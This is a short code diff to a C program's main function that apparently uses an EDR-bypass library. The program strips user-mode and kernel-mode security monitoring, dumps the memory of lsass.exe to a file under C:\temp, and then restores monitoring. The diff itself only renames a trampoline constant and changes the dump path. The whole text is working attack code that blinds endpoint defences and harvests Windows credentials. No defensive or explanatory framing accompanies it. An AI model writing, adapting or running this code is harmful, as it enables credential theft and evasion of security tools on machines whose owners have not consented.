@@ -23,9 +23,9 @@ int main()
     if (status = EDRSB_Init(&ctx, &cfg) != EDRSB_SUCCESS) {
         printf("EDRSB_Init: %u", status);
     }
-    Usermode_RemoveAllMonitoring(&ctx, Find_and_use_existing_trampoline);
+    Usermode_RemoveAllMonitoring(&ctx, EDRSB_UMTECH_Find_and_use_existing_trampoline);
     Krnlmode_RemoveAllMonitoring(&ctx);
-    Action_DumpProcessByName(&ctx, L"lsass.exe", L"C:\\no_scan\\tmp\\tmp.tmp", Find_and_use_existing_trampoline);
+    Action_DumpProcessByName(&ctx, L"lsass.exe", L"C:\\temp\\tmp.tmp", EDRSB_UMTECH_Find_and_use_existing_trampoline);
     Krnlmode_RestoreAllMonitoring(&ctx);
     EDRSB_CleanUp(&ctx);
 }
